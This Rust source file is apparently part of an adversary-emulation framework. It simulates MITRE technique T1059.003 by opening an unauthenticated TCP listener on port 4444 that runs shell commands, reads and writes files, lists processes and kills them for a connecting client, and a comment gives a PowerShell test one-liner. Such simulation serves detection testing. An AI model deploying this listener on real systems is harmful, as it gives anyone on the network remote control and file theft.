//! Simulation: Reverse Shell Server (T1059.003).
//!
//! Opens a TCP server on port 4444 and accepts a single client connection.  


// Once the shell is opened, you can test command via this single line PowerShell command:  
// $client = New-Object System.Net.Sockets.TcpClient; $client.Connect("127.0.0.1",4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); $writer.AutoFlush = $true; $writer.WriteLine("exec whoami"); $response = $reader.ReadLine(); Write-Output $response; $writer.Close(); $reader.Close(); $client.Close()

use anyhow::{Context, Result};
use chrono::Utc;
use std::fs;
use std::path::PathBuf;
use std::process::Command;
use std::str::from_utf8;
use std::time::{Duration, Instant};

use base64::{engine::general_purpose, Engine as _};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, BufWriter};
use tokio::net::{TcpListener, TcpStream};

use crate::core::config::Config;
use crate::core::logger;
use crate::core::simulation::Simulation;
use crate::core::telemetry::{ActionRecord, write_action_record};

#[derive(Default)]
pub struct RevSh;

impl RevSh {
    fn output_path() -> Option<PathBuf> {
        crate::core::telemetry::telemetry_dir().map(|mut p| {
            p.push("rev_sh_sim.log");
            p
        })
    }

    async fn handle_client(mut socket: TcpStream) -> Result<()> {
        let (reader, writer) = socket.split();
        let mut reader = BufReader::new(reader);
        let mut writer = BufWriter::new(writer);

        loop {
            let mut command = String::new();
            let bytes_read = reader.read_line(&mut command).await?;
            if bytes_read == 0 {
                break; // client closed
            }

            let response = match command.trim() {
                cmd if cmd.starts_with("exec ") => Self::exec_command(&cmd[5..]).await,
                cmd if cmd.starts_with("download ") => Self::download_file(&cmd[9..]).await,
                cmd if cmd.starts_with("upload ") => Self::upload_file(&cmd[7..], &mut reader).await,
                cmd if cmd.starts_with("ls ") => Self::list_directory(&cmd[3..]).await,
                cmd if cmd == "ps" => Self::list_processes().await,
                cmd if cmd.starts_with("kill ") => Self::kill_process(&cmd[5..]).await,
                _ => Err(format!("Unknown command: {}", command.trim())),
            };

            match response {
                Ok(output) => {
                    writer.write_all(output.as_bytes()).await?;
                }
                Err(e) => {
                    writer.write_all(format!("Error: {}\n", e).as_bytes()).await?;
                }
            }

            writer.flush().await?;
        }

        Ok(())
    }

    async fn exec_command(command: &str) -> Result<String, String> {
        let output = if cfg!(windows) {
            Command::new("cmd")
                .args(&["/C", command])
                .output()
                .map_err(|e| e.to_string())?
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(command)
                .output()
                .map_err(|e| e.to_string())?
        };

        Ok(format!(
            "{}{}",
            from_utf8(&output.stdout).unwrap_or(""),
            from_utf8(&output.stderr).unwrap_or("")
        ))
    }

    async fn download_file(path: &str) -> Result<String, String> {
        let contents = fs::read(path).map_err(|e| e.to_string())?;
        Ok(general_purpose::STANDARD.encode(&contents))
    }

            async fn upload_file(
            path: &str,
            reader: &mut BufReader<tokio::net::tcp::ReadHalf<'_>>,
        ) -> Result<String, String>  {
        let mut file_data = String::new();
        reader.read_line(&mut file_data).await.map_err(|e| e.to_string())?;
        let decoded = general_purpose::STANDARD
            .decode(file_data.trim())
            .map_err(|e| e.to_string())?;
        fs::write(path, decoded).map_err(|e| e.to_string())?;
        Ok("File uploaded successfully\n".to_string())
    }

    async fn list_directory(path: &str) -> Result<String, String> {
        let entries = fs::read_dir(path).map_err(|e| e.to_string())?;
        let mut result = String::new();
        for entry in entries {
            let entry = entry.map_err(|e| e.to_string())?;
            result.push_str(&format!("{}\n", entry.file_name().to_string_lossy()));
        }
        Ok(result)
    }

    async fn list_processes() -> Result<String, String> {
        let output = if cfg!(windows) {
            Command::new("tasklist")
                .output()
                .map_err(|e| e.to_string())?
        } else {
            Command::new("ps")
                .arg("aux")
                .output()
                .map_err(|e| e.to_string())?
        };

        Ok(format!(
            "{}{}",
            from_utf8(&output.stdout).unwrap_or(""),
            from_utf8(&output.stderr).unwrap_or("")
        ))
    }

    async fn kill_process(pid: &str) -> Result<String, String> {
        let pid: u32 = pid.parse().map_err(|e: std::num::ParseIntError| e.to_string())?;
        if cfg!(windows) {
            Command::new("taskkill")
                .args(&["/PID", &pid.to_string(), "/F"])
                .output()
                .map_err(|e| e.to_string())?;
        } else {
            Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .output()
                .map_err(|e| e.to_string())?;
        }
        Ok(format!("Killed process {}\n", pid))
    }

    async fn start_server() -> Result<()> {
        let listener = TcpListener::bind("0.0.0.0:4444").await
            .context("Failed to bind port 4444")?;

        logger::info("\nrev_sh server listening on port 4444 (10s)");

        let end = Instant::now() + Duration::from_secs(10);

        // Accept one connection
        loop {
            tokio::select! {
                Ok((socket, _)) = listener.accept() => {
                    logger::info("Client connected to rev_sh");
                    Self::handle_client(socket).await?;
                    break;
                }

                _ = tokio::time::sleep_until(tokio::time::Instant::from_std(end)) => {
                    logger::info("rev_sh server timed out (no connections)");
                    break;
                }
            }
        }

        Ok(())
    }
}

impl Simulation for RevSh {
    fn name(&self) -> &'static str {
        "windows::rev_sh"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        let out_path = Self::output_path()
            .ok_or_else(|| anyhow::anyhow!("could not resolve MagnetTelemetry path"))?;

        if cfg.dry_run {
            logger::info("dry-run: would start rev_sh listener on port 4444");
            let rec = ActionRecord {
                test_id: cfg.test_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                action: format!("T1059.003 - {}", self.name()),
                status: "dry-run".into(),
                details: "dry-run: no listener started".into(),
                artifact_path: Some(out_path.display().to_string()),
            };
            let _ = write_action_record(cfg, &rec);
            return Ok(());
        }

        logger::action_running("Starting rev_sh listener (10s, 1 connection max)");

        let runtime = tokio::runtime::Runtime::new()
            .context("Failed to create tokio runtime")?;

        let result = runtime.block_on(Self::start_server());

        let status = match &result {
            Ok(_) => "written",
            Err(_) => "failed",
        };

        let details = match &result {
            Ok(_) => "rev_sh server ran successfully".to_string(),
            Err(e) => format!("rev_sh error: {}", e),
        };

        let rec = ActionRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            action: format!("T1059.003 - {}", self.name()),
            status: status.into(),
            details,
            artifact_path: Some(out_path.display().to_string()),
        };

        let _ = write_action_record(cfg, &rec);

        match result {
            Ok(_) => {
                logger::action_ok();
                Ok(())
            }
            Err(e) => {
                logger::action_fail("rev_sh simulation failed");
                Err(e)
            }
        }
    }
}
